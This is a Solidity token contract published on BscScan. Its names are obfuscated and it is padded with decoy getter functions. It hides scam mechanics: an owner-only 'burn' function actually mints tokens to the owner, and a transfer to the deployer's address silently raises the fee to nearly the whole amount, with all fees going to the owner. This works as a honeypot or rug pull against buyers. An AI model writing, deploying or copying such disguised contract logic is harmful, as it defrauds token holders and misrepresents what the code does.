/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
 // SPDX-License-Identifier: MIT
 
pragma solidity >=0.6.0;
contract ROGAWHI {
address public owner;
address private  DTIWFW = address(0);
uint8 public constant decimals = 18;
uint256 private  CYUJFA = 100000000;
uint256 private  GAIWTP = 1000000000000000000;
uint256 public constant ABAJCA = 99999;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "FSCVIC";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  MZWFEH = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  VQQDZV = 1000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  KLWKUB = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  XFYRZJ = 1000000000000000000;
address private  CNQHQT = address(0);
uint256 private  XKKVBV = 10000000000000;
string public  symbol = "FSCVIC";
address private  XJVRFL = address(0);
uint256 private  UXOJPQ = 1000000000000000000000;
address private  IKXETO = address(0);
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getKLWKUB() private returns (address) {
return KLWKUB;
}

function _getUXOJPQ() private returns (uint256) {
return UXOJPQ;
}

function _getXKKVBV() private returns (uint256) {
return XKKVBV;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getDTIWFW() private returns (address) {
return DTIWFW;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getCYUJFA() private returns (uint256) {
return CYUJFA;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UOHFSK");
require(to != address(0), "UOHFSK");
require(amount <= balanceOf[from], "UOHFSK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ABAJCA/GAIWTP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==XJVRFL){
GAIWTP = ABAJCA+2;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tUOHFSK 0");
require(spender != address(0), "fUOHFSK 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getXFYRZJ() private returns (uint256) {
return XFYRZJ;
}

function _getCNQHQT() private returns (address) {
return CNQHQT;
}

function _getIKXETO() private returns (address) {
return IKXETO;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getMZWFEH() private returns (uint256) {
return MZWFEH;
}

constructor () public {
XJVRFL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getVQQDZV() private returns (uint256) {
return VQQDZV;
}


}